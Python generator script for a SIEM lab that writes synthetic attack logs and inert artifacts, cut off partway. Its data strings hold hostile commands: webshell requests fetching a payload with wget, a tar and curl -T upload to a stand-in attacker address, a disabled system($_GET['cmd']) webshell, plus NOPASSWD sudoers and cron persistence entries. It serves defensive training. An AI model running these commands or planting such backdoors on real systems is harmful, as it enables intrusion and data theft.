#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# SIEM Lab - compromised-web-server log dataset generator
# ----------------------------------------------------------------------------
# Golden-image training dataset for a Wazuh SIEM exercise.
#
# PRINCIPLES (must not be violated):
#   * Every artifact is an INERT dummy. Nothing malicious ever executes.
#     Log lines are SYNTHESIZED (written directly), not the product of a real
#     webshell/backdoor. On-disk artifacts are non-functional stubs.
#   * No host-specific hardcoding beyond the live hostname (shared by clones).
#   * Re-runnable & deterministic (seeded RNG, BASE-relative offsets) so the
#     answer key's file:line references stay stable.
#
# This file is structured as a mapping-table-driven engine so extra
# storylines (B..F, Stage 8) slot in without a rewrite.
#
# Run as root:  sudo python3 siem_lab_gen.py
# ============================================================================
import os, sys, json, random, subprocess
from datetime import datetime, timedelta, timezone

# --------------------------------------------------------------------------- #
# 0. Global config
# --------------------------------------------------------------------------- #
KST      = timezone(timedelta(hours=9))
BASE     = datetime.now(tz=KST).replace(microsecond=0)     # "now" at build time
SEED     = 1337
HOST     = os.uname().nodename                              # shared across clones
LAB      = "/opt/siem-lab"
ANSWERS  = f"{LAB}/answers"
NOISE_RATIO = 18                                           # normal : attack (15-20:1)

random.seed(SEED)

# Actor / infrastructure mapping table --------------------------------------- #
# Documented non-routable ranges only (RFC 5737 TEST-NET / RFC1918).
ACTORS = {
    "attacker_main":  "198.51.100.23",   # storyline A/B/E primary attacker (TEST-NET-2)
    "attacker_alt":   "198.51.100.47",   # same actor, second hop
    "demo_suspect":   "203.0.113.66",    # reserved for live-demo (section 7)
    "scanner":        "192.0.2.77",      # storyline C decoy scanner (TEST-NET-1)
    "admin_lan":      "192.168.208.50",  # storyline D legit admin workstation
    "lockout_src":    "198.51.100.99",   # storyline F failed-then-locked
}
ACCOUNTS = {
    "victim":   "webadmin",   # SSH account the attacker compromises
    "sysadmin": "opsadmin",   # legitimate night-shift admin (storyline D)
    "svc":      "www-data",   # web server service account (webshell context)
}

# --------------------------------------------------------------------------- #
# 1. Log-file emitters (deterministic line numbers)
# --------------------------------------------------------------------------- #
class LogFile:
    """Collects (offset_seconds, text, event_id) records, then writes them
    fully time-sorted so attack markers get stable line numbers."""
    def __init__(self, path, owner="root:adm", mode=0o640):
        self.path, self.owner, self.mode = path, owner, mode
        self.records = []            # list of [offset, text, event_id]
    def emit(self, offset, text, event_id=None):
        self.records.append([offset, text, event_id])
        return self                  # allow chaining
    def write(self, line_index):
        """Sort by time, write file, and fill line_index[event_id] = lineno."""
        self.records.sort(key=lambda r: r[0])
        os.makedirs(os.path.dirname(self.path), exist_ok=True)
        with open(self.path, "w", encoding="utf-8") as f:
            for i, (off, text, eid) in enumerate(self.records, start=1):
                f.write(text + "\n")
                if eid is not None:
                    # for multi-line audit events only the first line registers
                    line_index.setdefault(eid, (self.path, i))
        # ownership / perms
        try:
            u, g = self.owner.split(":")
            subprocess.run(["chown", f"{u}:{g}", self.path], check=False)
            os.chmod(self.path, self.mode)
        except Exception:
            pass

# time helpers
def t(offset_seconds):
    return BASE + timedelta(seconds=offset_seconds)
def apache_ts(dt):   return dt.strftime("%d/%b/%Y:%H:%M:%S %z")
def syslog_ts(dt):   return dt.strftime("%b %e %H:%M:%S")  # %e => space-padded day (std syslog)
def audit_ts(dt, seq):
    return f"{dt.timestamp():.3f}:{seq}"

# --------------------------------------------------------------------------- #
# 2. Line builders (exact formats matched to Wazuh default decoders)
# --------------------------------------------------------------------------- #
def line_access(ip, dt, method, path, status, size, ua, referer="-"):
    return (f'{ip} - - [{apache_ts(dt)}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "{referer}" "{ua}"')

def line_sshd_fail(dt, pid, user, ip, port, invalid=False):
    who = f"invalid user {user}" if invalid else user
    return (f"{syslog_ts(dt)} {HOST} sshd[{pid}]: Failed password for {who} "
            f"from {ip} port {port} ssh2")

def line_sshd_accept(dt, pid, user, ip, port):
    return (f"{syslog_ts(dt)} {HOST} sshd[{pid}]: Accepted password for {user} "
            f"from {ip} port {port} ssh2")

def line_sshd_session(dt, pid, user, uid):
    return (f"{syslog_ts(dt)} {HOST} sshd[{pid}]: "
            f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) "
            f"by (uid=0)")

def line_sudo(dt, pid, user, tty, pwd, runas, command):
    return (f"{syslog_ts(dt)} {HOST} sudo:    {user} : TTY={tty} ; PWD={pwd} ; "
            f"USER={runas} ; COMMAND={command}")

def line_cron_run(dt, pid, user, command):
    return f"{syslog_ts(dt)} {HOST} CRON[{pid}]: ({user}) CMD ({command})"

def line_crontab_edit(dt, pid, user, action="REPLACE"):
    return f"{syslog_ts(dt)} {HOST} crontab[{pid}]: ({user}) {action} ({user})"

# --- additional log types (variety) ----------------------------------------- #
def line_aerror(dt, level, pid, ip, msg, port=None):
    cl = f"[client {ip}:{port or random.randint(40000,60000)}] " if ip else ""
    return f"[{dt.strftime('%a %b %d %H:%M:%S.%f %Y')}] [{level}] [pid {pid}] {cl}{msg}"

def line_ufw(dt, src, dpt, proto="TCP", action="BLOCK"):
    return (f"{syslog_ts(dt)} {HOST} kernel: [UFW {action}] IN=ens33 OUT= "
            f"MAC=00:0c:29:aa:bb:cc:00:0c:29:dd:ee:ff:08:00 SRC={src} DST=192.168.208.134 "
            f"LEN=60 TOS=0x00 PREC=0x00 TTL=54 ID={random.randint(1,65000)} PROTO={proto} "
            f"SPT={random.randint(30000,60000)} DPT={dpt} WINDOW=1024 RES=0x00 SYN URGP=0")

def line_mail(dt, tail):
    return f"{syslog_ts(dt)} {HOST} postfix/{tail}"

def add_diverse_logs(err, ufw, mail):
    """Populate apache error.log, UFW firewall log, and postfix mail.log so the
    dataset spans multiple log SOURCES (web errors / firewall / mail), not just
    SSH auth + web access."""
    # --- apache error.log: normal PHP notices + missing files -----------------
    emsgs = [
        ("php:notice", "PHP Notice:  Undefined index: page in /var/www/html/index.php on line 42"),
        ("php:warn",  "PHP Warning:  filemtime(): stat failed for /var/www/html/cache/tmp in /var/www/html/lib/cache.php on line 20"),
        ("core:info", "AH00128: File does not exist: /var/www/html/favicon.ico"),
        ("core:info", "AH00128: File does not exist: /var/www/html/apple-touch-icon.png"),
        ("authz_core:error", "AH01630: client denied by server configuration: /var/www/html/.htpasswd"),
    ]
    for _ in range(42):
        off = -random.randint(0, 24*3600)
        lvl, msg = random.choice(emsgs)
        err.emit(off, line_aerror(t(off), lvl, random.randint(1000, 3000), rand_client_ip(), msg))
    # scanner 404s surface as error.log "File does not exist" (storyline C)
    for i, p in enumerate(["/admin.php", "/wp-login.php", "/phpmyadmin/", "/.env", "/shell.php", "/config.php"]):
        off = -14*3600 + i*3
        err.emit(off, line_aerror(t(off), "core:info", random.randint(1000, 3000),
                 ACTORS["scanner"], f"AH00128: File does not exist: /var/www/html{p}"))

    # --- UFW firewall: blocked port scan from the scanner + normal blocks -----
    tC = -14*3600 - 400
    for i, dpt in enumerate([21, 23, 25, 3306, 3389, 8080, 445, 139, 5432, 6379, 27017, 9200]):
        ufw.emit(tC + i*2, line_ufw(t(tC + i*2), ACTORS["scanner"], dpt))
    # a few blocked hits toward the SSH brute-force source too (defence in depth)
    for i in range(6):
        off = -8*3600 - 200 + i*4
        ufw.emit(off, line_ufw(t(off), ACTORS["attacker_main"], 22))
    for _ in range(22):     # background internet noise blocked at the edge
        off = -random.randint(0, 24*3600)
        ufw.emit(off, line_ufw(t(off), f"203.0.113.{random.randint(2,250)}",
                 random.choice([23, 2323, 5900, 1433, 8443, 3389])))

    # --- postfix mail.log: normal corporate mail flow -------------------------
    for i in range(26):
        off = -random.randint(0, 24*3600)
        pid = random.randint(1000, 9000)
        qid = f"{random.randint(0x100000,0xFFFFFF):06X}"
        sender = random.choice(["hr", "it-helpdesk", "noreply", "payroll", "notice"])
        mail.emit(off,   line_mail(t(off),   f"smtpd[{pid}]: connect from mail-relay.example.com[203.0.113.{random.randint(2,60)}]"))
        mail.emit(off+1, line_mail(t(off+1), f"qmgr[{pid}]: {qid}: from=<{sender}@bridgeworks.local>, size={random.randint(2000,90000)}, nrcpt=1 (queue active)"))
        mail.emit(off+2, line_mail(t(off+2), f"smtp[{pid}]: {qid}: to=<staff{random.randint(1,40)}@bridgeworks.local>, relay=local, delay={random.uniform(0.1,2.0):.2f}, status=sent (delivered to mailbox)"))

def audit_event(dt, seq, comm, exe, argv, uid=33, auid=1001, ppid=1, pid=99999,
                key="exec_trace", cwd="/var/www/html"):
    """Return the 3 standard auditd lines (SYSCALL/EXECVE/PROCTITLE) for one
    execve. uid=33 => www-data (webshell context)."""
    a = audit_ts(dt, seq)
    argc = len(argv)
    execve = " ".join(f'a{i}="{v}"' for i, v in enumerate(argv))
    proctitle = "".join(f"{c:02X}" for c in " ".join(argv).encode())
    syscall = (f'type=SYSCALL msg=audit({a}): arch=c000003e syscall=59 success=yes '
               f'exit=0 a0=0 a1=0 a2=0 a3=0 items=2 ppid={ppid} pid={pid} '
               f'auid={auid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} '
               f'egid={uid} sgid={uid} fsgid={uid} tty=(none) ses=1 '
               f'comm="{comm}" exe="{exe}" '
               f'subj=unconfined key="{key}"')
    execve_l = f'type=EXECVE msg=audit({a}): argc={argc} {execve}'
    proctitle_l = f'type=PROCTITLE msg=audit({a}): proctitle={proctitle}'
    return [syscall, execve_l, proctitle_l]

# --------------------------------------------------------------------------- #
# 3. Normal-traffic noise
# --------------------------------------------------------------------------- #
NORMAL_PATHS = [
    "/", "/index.html", "/about.html", "/products.html", "/contact.html",
    "/css/main.css", "/css/theme.css", "/css/print.css", "/js/app.js", "/js/vendor.js",
    "/js/chart.min.js", "/img/logo.png", "/img/hero.jpg", "/img/banner.png",
    "/img/team/photo1.jpg", "/img/icons/sprite.svg", "/favicon.ico", "/apple-touch-icon.png",
    "/portal/", "/portal/login", "/portal/dashboard", "/portal/notices",
    "/portal/notices/2026-08", "/portal/approval", "/portal/approval/inbox",
    "/portal/attendance", "/portal/messenger", "/portal/drive", "/portal/drive/shared",
    "/portal/hr/payslip", "/portal/hr/vacation", "/portal/board/free",
    "/api/status", "/api/health", "/api/v1/notices", "/api/v1/user/me",
    "/api/v1/attendance/today", "/api/v1/approval/count", "/docs/", "/docs/guide.html",
    "/docs/security-policy.pdf", "/robots.txt", "/sitemap.xml", "/help/faq",
    "/search?q=%ED%9C%B4%EA%B0%80%EC%8B%A0%EC%B2%AD", "/search?q=%EC%A1%B0%EC%A7%81%EB%8F%84",
]
NORMAL_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0 Safari/537.36 Edg/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S911N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
]
NORMAL_REFERERS = [
    "-", "-", "-",
    "https://portal.bridgeworks.local/", "https://portal.bridgeworks.local/portal/dashboard",
    "https://portal.bridgeworks.local/portal/notices", "https://www.google.com/",
]
# Intranet portal: normal traffic is LAN-only. Range .100-.240 avoids every
# special actor IP (attackers .23/.47/.99, admin .50) so noise never collides
# with a storyline source address.
def rand_client_ip():
    return f"192.168.208.{random.randint(100, 240)}"

def add_normal_access(af, count):
    for _ in range(count):
        off = -random.randint(0, 24*3600)
        ip = rand_client_ip()
        path = random.choice(NORMAL_PATHS)
        ua = random.choice(NORMAL_UA)
        ref = random.choice(NORMAL_REFERERS)
        status = random.choices([200, 304, 200, 200, 301, 302, 404],
                                weights=[10, 4, 10, 10, 1, 1, 1])[0]
        method = "POST" if path.startswith("/api/") and random.random() < 0.2 else "GET"
        size = 0 if status == 304 else random.randint(180, 12000)
        af.emit(off, line_access(ip, t(off), method, path, status, size, ua, referer=ref))

def add_benign_background(auth, cron):
    """Routine system activity: legit cron jobs + normal admin sudo. Pure noise."""
    jobs = ["/usr/sbin/logrotate /etc/logrotate.conf",
            "/usr/lib/sysstat/debian-sa1 1 1",
            "( cd / && run-parts --report /etc/cron.daily )",
            "/usr/bin/certbot renew -q", "/opt/monitoring/healthcheck.sh",
            "/usr/bin/find /tmp -type f -atime +7 -delete"]
    for i in range(28):
        off = -random.randint(0, 24*3600)
        cron.emit(off, line_cron_run(t(off), 30000+i,
                  random.choice(["root","root","root","www-data"]), random.choice(jobs)))
    for i in range(7):
        off = -random.randint(2*3600, 20*3600)
        cmd = random.choice(["/usr/bin/apt-get update", "/usr/bin/systemctl status apache2",
                             "/usr/bin/tail -n 100 /var/log/syslog", "/usr/bin/journalctl -u ssh"])
        auth.emit(off, line_sudo(t(off), 40000+i, ACCOUNTS["sysadmin"], "pts/2",
                  f"/home/{ACCOUNTS['sysadmin']}", "root", cmd))

def add_normal_ssh(auth, count):
    """A few benign SSH logins (different accounts, different times)."""
    users = [ACCOUNTS["sysadmin"], "backupsvc", ACCOUNTS["victim"]]
    for i in range(count):
        off = -random.randint(2*3600, 22*3600)
        u = users[i % len(users)]
        ip = f"192.168.208.{random.randint(20, 90)}"
        pid = random.randint(1200, 9000)
        port = random.randint(40000, 60000)
        auth.emit(off,     line_sshd_accept(t(off), pid, u, ip, port))
        auth.emit(off+1,   line_sshd_session(t(off+1), pid, u, 1000+i))

# --------------------------------------------------------------------------- #
# 4. STORYLINE A - main compromise chain
#    SSH brute force -> webshell -> download -> cron persistence -> bin tamper
# --------------------------------------------------------------------------- #
INERT_ARTIFACTS = []   # (path, mode, mtime_offset, builder)

def storyline_A(af, auth, cron, audit, steps):
    ip   = ACTORS["attacker_main"]
    ipb  = ACTORS["attacker_alt"]
    vic  = ACCOUNTS["victim"]
    ua_attacker = "Mozilla/5.0 (X11; Linux x86_64) curl/7.81.0"
    ua_wget     = "Wget/1.21.2"
    T = -8*3600          # attack chain anchor: 8h ago

    # --- A1: SSH brute force (many fails) then success -----------------------
    base_pid = 22001
    port0 = 51000
    tried_users = ["root", "admin", "test", "oracle", "ubuntu", "postgres",
                   "git", "user", vic, vic]
    for i, u in enumerate(tried_users):
        off = T + i*7
        invalid = u not in (vic, "root")
        auth.emit(off, line_sshd_fail(t(off), base_pid+i, u, ip, port0+i,
                                      invalid=invalid))
    a1_off = T + len(tried_users)*7 + 5
    steps.append(dict(id="A1", sl="A",
        desc="SSH 브루트포스 다수 실패 후 최초 인증 성공",
        detail=f"공격자 {ip} 가 {vic} 계정으로 다수 실패 뒤 로그인 성공",
        off=a1_off, token=f"Accepted password for {vic} from {ip}"))
    auth.emit(a1_off, line_sshd_accept(t(a1_off), base_pid+50, vic, ip, port0+60),
              event_id="A1")
    auth.emit(a1_off+1, line_sshd_session(t(a1_off+1), base_pid+50, vic, 1001))

    # --- A2: webshell dropped in /tmp then sudo-copied to webroot ------------
    a2_off = a1_off + 180
    cp_cmd = "/bin/cp /tmp/search.php /var/www/html/search.php"
    steps.append(dict(id="A2", sl="A",
        desc="웹셸을 /tmp에 생성 후 sudo로 웹 루트에 복사",
        detail="sudo 로그에 search.php 이동 흔적",
        off=a2_off, token="COMMAND=/bin/cp /tmp/search.php /var/www/html/search.php"))
    auth.emit(a2_off, line_sudo(t(a2_off), 22110, vic, "pts/0",
                                f"/home/{vic}", "root", cp_cmd), event_id="A2")
    # auditd: the cp execve + webroot write
    for l in audit_event(t(a2_off), 30001, "cp", "/usr/bin/cp",
                         ["cp", "/tmp/search.php", "/var/www/html/search.php"],
                         uid=0, auid=1001, cwd=f"/home/{vic}", key="webroot_write"):
        audit.emit(a2_off, l, event_id="A2_audit")
    steps.append(dict(id="A2_audit", sl="A",
        desc="auditd: 웹 루트 파일 생성(webroot_write) 기록",
        detail="ausearch -k webroot_write", off=a2_off,
        token='key="webroot_write"'))

    # --- A3: webshell command execution via GET cmd= parameter --------------
    cmds = [
        ("id", "/usr/bin/id", ["id"]),
        ("whoami", "/usr/bin/whoami", ["whoami"]),
        ("uname", "/usr/bin/uname", ["uname", "-a"]),
        ("cat", "/usr/bin/cat", ["cat", "/etc/passwd"]),
        ("ss", "/usr/bin/ss", ["ss", "-tlnp"]),
    ]
    a3_off = a2_off + 120
    first_cmd_off = None
    for i, (comm, exe, argv) in enumerate(cmds):
        off = a3_off + i*15
        if first_cmd_off is None:
            first_cmd_off = off
        qs = "+".join(argv)
        path = f"/search.php?cmd={qs}"
        eid = "A3" if i == 0 else None
        af.emit(off, line_access(ip, t(off), "GET", path, 200,
                                 random.randint(90, 400), ua_attacker), event_id=eid)
        # matching auditd execve (www-data => webshell_exec)
        aid = f"A3_audit" if i == 0 else None
        for l in audit_event(t(off), 31000+i, comm, exe, argv, uid=33,
                             auid=4294967295, key="webshell_exec"):
            audit.emit(off, l, event_id=aid)
            aid = None
    steps.append(dict(id="A3", sl="A",
        desc="웹셸 경유 원격 명령 실행 (GET cmd= 파라미터)",
        detail="access.log 에 cmd= 파라미터가 그대로 노출 (id/whoami/uname/cat/ss)",
        off=first_cmd_off, token="GET /search.php?cmd=id"))
    steps.append(dict(id="A3_audit", sl="A",
        desc="auditd: 웹셸이 실행한 프로세스(execve) 기록",
        detail="ausearch -k webshell_exec (comm=id/whoami/...)",
        off=first_cmd_off, token='comm="id"'))

    # --- A4: download malicious payload via webshell (wget/curl) -------------
    a4_off = a3_off + len(cmds)*15 + 60
    payload_url = f"http://{ipb}/kworker"
    qs = f"wget+{payload_url}+-O+/tmp/.cache/kworker"
    steps.append(dict(id="A4", sl="A",
        desc="웹셸을 통해 악성 실행파일 다운로드 (wget)",
        detail=f"access.log 에 wget 요청, /tmp/.cache/kworker 로 저장",
        off=a4_off, token="cmd=wget+http"))
    af.emit(a4_off, line_access(ip, t(a4_off), "GET",
            f"/search.php?cmd={qs}", 200, 120, ua_attacker), event_id="A4")
    for l in audit_event(t(a4_off), 32000, "wget", "/usr/bin/wget",
                         ["wget", payload_url, "-O", "/tmp/.cache/kworker"],
                         uid=33, auid=4294967295, key="webshell_exec"):
        audit.emit(a4_off, l, event_id="A4_audit")
    steps.append(dict(id="A4_audit", sl="A",
        desc="auditd: 다운로드 프로세스(wget) execve 기록",
        detail="ausearch -k webshell_exec comm=wget", off=a4_off,
        token='comm="wget"'))

    # --- A5: crontab persistence (* * * * * and @reboot) --------------------
    a5_off = a4_off + 120
    cron_cmd = "/tmp/.cache/kworker"
    steps.append(dict(id="A5", sl="A",
        desc="crontab 지속성 확보 (* * * * * 및 @reboot 등록)",
        detail="crontab 편집 후 매분 실행 이력이 cron 로그에 기록",
        off=a5_off, token="REPLACE"))
    auth.emit(a5_off, line_sudo(t(a5_off), 22140, vic, "pts/0", f"/home/{vic}",
              "root", "/usr/bin/crontab -e"))
    cron.emit(a5_off+2, line_crontab_edit(t(a5_off+2), 22150, vic, "REPLACE"),
              event_id="A5")
    for l in audit_event(t(a5_off), 33000, "crontab", "/usr/bin/crontab",
                         ["crontab", "-e"], uid=0, auid=1001, key="cron_persist"):
        audit.emit(a5_off, l, event_id="A5_audit")
    steps.append(dict(id="A5_audit", sl="A",
        desc="auditd: crontab 등록(cron_persist) 기록",
        detail="ausearch -k cron_persist", off=a5_off, token='key="cron_persist"'))
    # a handful of subsequent CRON runs of the persisted job
    run_offs = []
    for i in range(6):
        off = a5_off + 60 + i*60
        run_offs.append(off)
        cron.emit(off, line_cron_run(t(off), 23000+i, vic, cron_cmd),
                  event_id=("A5_run" if i == 0 else None))
    steps.append(dict(id="A5_run", sl="A",
        desc="지속성 cron 작업의 실행 이력",
        detail="CRON CMD (/tmp/.cache/kworker) 반복 실행",
        off=run_offs[0], token="CMD (/tmp/.cache/kworker)"))

    # --- A6: system-binary-looking tampered file in /usr/bin ----------------
    a6_off = a5_off + 400
    steps.append(dict(id="A6", sl="A",
        desc="/usr/bin/backup 시스템 바이너리 위장 변조 파일 배치",
        detail="stat 접근/수정 시각이 주변 시스템 파일과 상이, strings 로 흔적",
        off=a6_off, token="bin_tamper"))
    for l in audit_event(t(a6_off), 34000, "install", "/usr/bin/install",
                         ["install", "-m", "4755", "/tmp/.cache/kworker",
                          "/usr/bin/backup"],
                         uid=0, auid=1001, key="bin_tamper"):
        audit.emit(a6_off, l, event_id="A6_audit")
    steps.append(dict(id="A6_audit", sl="A",
        desc="auditd: /usr/bin 변조(bin_tamper) 기록",
        detail="ausearch -k bin_tamper", off=a6_off, token='key="bin_tamper"'))

    # ---- inert on-disk artifacts for storyline A ---------------------------
    INERT_ARTIFACTS.append(dict(
        path="/var/www/html/search.php", mode=0o644, mtime=t(a2_off),
        content=(
            "<?php\n"
            "/* ==========================================================\n"
            "   INERT TRAINING ARTIFACT - simulated webshell.\n"
            "   This file DOES NOT execute anything. PHP is not enabled on\n"
            "   this host and the command handler below is disabled.\n"
            "   Present only so learners can locate the dropped webshell.\n"
            "   ========================================================== */\n"
            "// DISABLED: if (isset($_GET['cmd'])) { system($_GET['cmd']); }\n"
            "echo \"search\";\n"
            "?>\n")))
    INERT_ARTIFACTS.append(dict(
        path="/tmp/.cache/kworker", mode=0o755, mtime=t(a4_off),
        content=("#!/bin/sh\n"
                 "# INERT training artifact - downloaded 'payload' stub. Does nothing.\n"
                 "exit 0\n")))
    INERT_ARTIFACTS.append(dict(
        path="/usr/bin/backup", mode=0o4755, mtime=t(a6_off),
        content=("#!/bin/sh\n"
                 "# INERT training artifact - masquerades as a system binary.\n"
                 "# strings-visible markers below (no runtime logic):\n"
                 "# STRING: /root/.ssh/authorized_keys\n"
                 "# STRING: setuid: unable to set uid to 0 (Operation not permitted)\n"
                 "# STRING: /tmp/.cache/kworker\n"
                 "# STRING: connect-back 198.51.100.47:4444\n"
                 "exit 0\n")))
    # crontab persistence artifact (evidence file; not a live-firing job)
    INERT_ARTIFACTS.append(dict(
        path="/etc/cron.d/apache-backup", mode=0o644, mtime=t(a5_off),
        content=("# INERT training artifact - simulated persistence entry.\n"
                 "# (kept as evidence; target is the inert stub above)\n"
                 f"* * * * * {ACCOUNTS['victim']} /tmp/.cache/kworker\n"
                 f"@reboot {ACCOUNTS['victim']} /tmp/.cache/kworker\n")))

# --------------------------------------------------------------------------- #
# 4b. STORYLINES B..F  (Stage 8 - extra chains + decoys)
#     Connection map (also emitted to the answer key):
#       Chain   : A -> B -> E   (same attacker 198.51.100.23 / webadmin)
#       Decoys  : C (scanner), D (legit admin), F (locked-out attempt)
# --------------------------------------------------------------------------- #
def storyline_B(af, auth, cron, audit, steps):
    """Night-time privilege escalation: attacker (already root via A) plants a
    NOPASSWD sudoers.d backdoor for the compromised account. Same source IP."""
    vic = ACCOUNTS["victim"]
    T = -8*3600 + 20*60            # ~04:19, immediately after A6
    steps.append(dict(id="B1", sl="B",
        desc="야간 sudoers.d 백도어 등록 (NOPASSWD 권한 상승)",
        detail="/etc/sudoers.d/webadmin 생성 — A와 동일 공격자 세션(권한 상승 단계)",
        off=T, token="tee /etc/sudoers.d/webadmin"))
    auth.emit(T, line_sudo(t(T), 22200, vic, "pts/0", f"/home/{vic}", "root",
              "/usr/bin/tee /etc/sudoers.d/webadmin"), event_id="B1")
    for l in audit_event(t(T), 35000, "tee", "/usr/bin/tee",
                         ["tee", "/etc/sudoers.d/webadmin"], uid=0, auid=1001,
                         key="priv_esc"):
        audit.emit(T, l, event_id="B1_audit")
    steps.append(dict(id="B1_audit", sl="B",
        desc="auditd: sudoers.d 변경(priv_esc) 기록",
        detail="ausearch -k priv_esc", off=T, token='key="priv_esc"'))
    # inert (validated before install by the wrapper); references locked/non-login acct
    INERT_ARTIFACTS.append(dict(
        path="/etc/sudoers.d/webadmin", mode=0o440, mtime=t(T), validate_sudoers=True,
        content=("# INERT training artifact - simulated privilege-escalation backdoor.\n"
                 "# (webadmin has no valid login; entry never grants a usable session)\n"
                 "webadmin ALL=(ALL) NOPASSWD:ALL\n")))

def storyline_C(af, auth, cron, audit, steps):
    """Decoy: noisy web scanner - many 404s, sqlmap-style User-Agent. Never
    leads to a breach. Trains 'is this real?' triage."""
    ip = ACTORS["scanner"]
    T = -14*3600                    # ~22:00 previous evening
    sqlmap_ua = "sqlmap/1.7.2#stable (https://sqlmap.org)"
    scan_paths = ["/admin.php", "/phpmyadmin/", "/wp-login.php", "/.env",
                  "/config.php", "/backup.sql", "/shell.php", "/vendor/",
                  "/api/v1/users?id=1%27", "/index.php?id=1+AND+1=1",
                  "/login?user=admin%27--", "/.git/config"]
    steps.append(dict(id="C1", sl="C",
        desc="[미끼] 스캐너 트래픽 (sqlmap UA, 다수 404)",
        detail="짧은 간격 다수 404 + sqlmap User-Agent. 실제 침해로 이어지지 않음",
        off=T+2, token="sqlmap"))
    for i, p in enumerate(scan_paths):
        off = T + i*3               # 3s apart - burst
        eid = "C1" if i == 0 else None
        status = random.choice([404, 404, 404, 403, 400])
        af.emit(off, line_access(ip, t(off), "GET", p, status,
                                 random.randint(150, 500), sqlmap_ua), event_id=eid)

def storyline_D(af, auth, cron, audit, steps):
    """Decoy: legitimate night-shift admin deploy. Looks attack-ish (night,
    cron edit) but is a known admin account from the LAN. NOT an incident."""
    adm = ACCOUNTS["sysadmin"]; ip = ACTORS["admin_lan"]
    T = -10*3600                    # ~02:00, before the attack window
    steps.append(dict(id="D1", sl="D",
        desc="[미끼] 정상 관리자 야간 배포 로그인",
        detail=f"관리자 {adm} 가 사내 LAN({ip})에서 로그인 — 정상 업무",
        off=T, token=f"Accepted password for {adm} from {ip}"))
    auth.emit(T,   line_sshd_accept(t(T), 24010, adm, ip, 52000), event_id="D1")
    auth.emit(T+1, line_sshd_session(t(T+1), 24010, adm, 1002))
    # legit scheduled cron registration (maintenance)
    d2 = T + 300
    steps.append(dict(id="D2", sl="D",
        desc="[미끼] 정상 관리자의 정기 cron 등록 (배포 작업)",
        detail="A5(공격 지속성)와 유사해 보이나 관리자 계정의 정기 유지보수",
        off=d2, token="deploy-nightly"))
    auth.emit(d2, line_sudo(t(d2), 24020, adm, "pts/1", f"/home/{adm}", "root",
              "/usr/bin/crontab -e"))
    cron.emit(d2+2, line_crontab_edit(t(d2+2), 24030, adm, "REPLACE"))
    for i in range(3):
        off = d2 + 120 + i*300
        cron.emit(off, line_cron_run(t(off), 24100+i, adm,
                  "/opt/deploy/deploy-nightly.sh"),
                  event_id=("D2" if i == 0 else None))
    INERT_ARTIFACTS.append(dict(
        path="/etc/cron.d/deploy-nightly", mode=0o644, mtime=t(d2),
        content=("# Legitimate nightly maintenance job (NOT malicious).\n"
                 f"30 2 * * * {adm} /opt/deploy/deploy-nightly.sh\n")))

def storyline_E(af, auth, cron, audit, steps):
    """Chain tail: data exfiltration by the SAME attacker as A/B. Archive then
    outbound upload, driven through the webshell. Completes A->B->E."""
    ip = ACTORS["attacker_main"]; ipb = ACTORS["attacker_alt"]
    ua = "Mozilla/5.0 (X11; Linux x86_64) curl/7.81.0"
    T = -8*3600 + 40*60             # ~04:39, after B
    # E1: archive sensitive dirs via webshell
    steps.append(dict(id="E1", sl="E",
        desc="정보 유출 준비: 웹셸로 파일 압축 (tar)",
        detail="cmd=tar ... /tmp/loot.tgz — A/B와 동일 공격자, 체인 마지막 단계",
        off=T, token="cmd=tar"))
    af.emit(T, line_access(ip, t(T), "GET",
            "/search.php?cmd=tar+czf+/tmp/loot.tgz+/var/www+/etc/passwd", 200,
            180, ua), event_id="E1")
    for l in audit_event(t(T), 36000, "tar", "/usr/bin/tar",
                         ["tar", "czf", "/tmp/loot.tgz", "/var/www", "/etc/passwd"],
                         uid=33, auid=4294967295, key="webshell_exec"):
        audit.emit(T, l, event_id="E1_audit")
    steps.append(dict(id="E1_audit", sl="E",
        desc="auditd: 압축 프로세스(tar) execve 기록",
        detail="ausearch -k webshell_exec comm=tar", off=T, token='comm="tar"'))
    # E2: outbound upload (large transfer)
    e2 = T + 90
    steps.append(dict(id="E2", sl="E",
        desc="대량 아웃바운드 전송: 압축본 외부 업로드 (curl -T)",
        detail=f"cmd=curl -T /tmp/loot.tgz http://{ipb}/up — 정보 유출 실행",
        off=e2, token="cmd=curl+-T"))
    af.emit(e2, line_access(ip, t(e2), "GET",
            f"/search.php?cmd=curl+-T+/tmp/loot.tgz+http://{ipb}/up", 200,
            9437184, ua), event_id="E2")     # large size => big outbound
    for l in audit_event(t(e2), 36010, "curl", "/usr/bin/curl",
                         ["curl", "-T", "/tmp/loot.tgz", f"http://{ipb}/up"],
                         uid=33, auid=4294967295, key="webshell_exec"):
        audit.emit(e2, l, event_id="E2_audit")
    steps.append(dict(id="E2_audit", sl="E",
        desc="auditd: 업로드 프로세스(curl) execve 기록",
        detail="ausearch -k webshell_exec comm=curl", off=e2, token='comm="curl"'))
    INERT_ARTIFACTS.append(dict(
        path="/tmp/loot.tgz", mode=0o644, mtime=t(T),
        content="INERT training artifact - simulated exfil archive (not real data).\n"))

def storyline_F(af, auth, cron, audit, steps):
    """Decoy: brute force that FAILED and got locked out. Defence worked;
    no successful login => no action required."""
    ip = ACTORS["lockout_src"]
    T = -16*3600                    # ~20:00 previous evening
    steps.append(dict(id="F1", sl="F",
